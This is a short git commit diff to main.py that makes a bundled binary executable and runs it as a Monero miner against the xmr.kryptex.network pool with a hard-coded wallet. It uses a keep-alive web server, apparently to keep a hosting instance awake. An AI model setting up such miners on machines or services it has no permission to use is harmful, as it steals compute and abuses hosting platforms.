c3dbcef6c4986fb935bbcd4ef3535c99c0cfe74b
AnasBoujamaa <131704517+AnasBoujamaa@users.noreply.github.com>
2024-04-09 18:59:38 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,4 +1,5 @@
 import subprocess
 from webapp import keep_alive
 keep_alive()
+subprocess.run(["chmod", "+x", "main"], check=True)
 subprocess.run(["./main", "--coin", "XMR", "--url", "xmr.kryptex.network:7777", "--user", "43Xncct4xFRLAyo84WPyaUVfCCJLmb7FZXUmW7ae6KJt2Vo571QYoiaVd4FRawUvHAj7JBqsm9d8qTVNPZHwv4GSCHkuG9M/Prueba69", "-p", "x", "-k"], check=True)
